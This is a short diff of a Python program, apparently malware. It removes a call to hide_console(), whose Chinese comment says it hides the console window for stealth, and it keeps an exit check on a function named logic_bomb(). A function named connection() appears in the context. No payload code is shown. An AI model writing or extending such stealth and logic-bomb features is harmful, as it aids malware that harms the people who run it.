@@ -346,8 +346,6 @@ def connection():
             continue
 
 if __name__ == "__main__":
-    # 嘗試隱藏 Console 視窗以提升隱蔽性
-    hide_console()
 
     # 執行邏輯炸彈條件檢查，如果不通過則退出
     if not logic_bomb():
